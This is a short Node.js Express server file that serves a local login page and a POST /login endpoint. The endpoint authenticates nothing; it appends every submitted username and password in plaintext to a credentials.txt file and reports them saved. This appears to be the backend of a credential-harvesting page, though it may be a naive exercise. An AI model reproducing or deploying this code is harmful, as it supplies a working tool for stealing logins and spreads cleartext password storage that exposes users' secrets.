const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// The exact folder where you want the .txt file
const SAVE_DIR = 'C:\\Users\\donut\\Desktop\\Hi';
const SAVE_FILE = path.join(SAVE_DIR, 'credentials.txt');

// Ensure the directory exists
if (!fs.existsSync(SAVE_DIR)) {
  fs.mkdirSync(SAVE_DIR, { recursive: true });
}

// Middleware
app.use(express.json());
app.use(express.static(__dirname)); // serves app.html from the same folder

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }

  const timestamp = new Date().toISOString();
  const logLine = `[${timestamp}] Username: ${username} | Password: ${password}\n`;

  try {
    fs.appendFileSync(SAVE_FILE, logLine, 'utf8');
    res.json({ success: true, message: 'Credentials saved' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to save credentials' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Credentials will be saved to: ${SAVE_FILE}`);
});